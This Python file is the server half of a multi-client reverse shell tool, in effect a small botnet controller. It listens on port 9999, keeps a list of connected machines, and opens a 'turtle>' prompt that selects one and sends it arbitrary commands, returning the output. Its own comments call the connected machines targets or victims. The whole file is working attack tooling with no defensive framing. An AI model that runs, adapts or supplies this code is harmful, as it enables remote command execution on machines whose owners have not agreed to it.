import socket
import sys
import threading
import time
from queue import Queue

numbeOfThreads = 2
jobNumber= [1, 2]
queue = Queue()
allConnections = []
allAddress = []


# Create a Socket ( connect two computers)
def createSocket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bindSocket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bindSocket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def acceptingConnections():
    for c in allConnections:
        c.close()

    del allConnections[:]
    del allAddress[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            allConnections.append(conn)
            allAddress.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir


def startTurtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            listConnections()
        elif 'select' in cmd:
            conn = getTarget(cmd)
            if conn is not None:
                sendTargetCommands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def listConnections():
    results = ''

    for i, conn in enumerate(allConnections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del allConnections[i]
            del allAddress[i]
            continue

        results = str(i) + "   " + str(allAddress[i][0]) + "   " + str(allAddress[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def getTarget(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = allConnections[target]
        print("You are now connected to :" + str(allAddress[target][0]))
        print(str(allAddress[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def sendTargetCommands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def createWorker():
    for _ in range(numbeOfThreads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            createSocket()
            bindSocket()
            acceptingConnections()
        if x == 2:
            startTurtle()

        queue.task_done()


def createJob():
    for x in jobNumber:
        queue.put(x)

    queue.join()


createWorker()
createJob()